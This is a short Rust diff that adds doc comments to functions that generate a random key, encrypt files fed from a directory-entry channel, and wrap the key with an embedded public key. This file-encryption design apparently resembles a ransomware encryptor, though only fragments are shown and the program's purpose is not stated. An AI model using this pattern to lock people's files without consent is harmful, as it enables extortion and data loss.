@@ -10,12 +10,14 @@ use zeroize::Zeroize;
 
 use crate::PUB_KEY;
 
+/// generates a key using `openssl::rand::rand_bytes()` method
 pub(crate) fn generate_key() -> Vec<u8> {
     let mut key = vec![0 as u8; 32];
     rand_bytes(&mut key).unwrap();
     key
 }
 
+/// encrypts files from the `r` reciever using the provided `key`. Exits when it runs out of files to encrypt.
 pub(crate) async fn encrypt_files(r: Receiver<DirEntry>, mut key: Vec<u8>) {
     event!(Level::DEBUG, "Encryption worker started.");
     while r.len() != 0 {
@@ -47,6 +49,7 @@ pub(crate) async fn encrypt_files(r: Receiver<DirEntry>, mut key: Vec<u8>) {
     key.zeroize();
 }
 
+/// wraps a key using the embedded `PUB_KEY` value
 pub(crate) fn wrap_key(key: &Vec<u8>) -> Vec<u8> {
     // import key
     let rsa_key = rsa::Rsa::public_key_from_pem(PUB_KEY).unwrap();
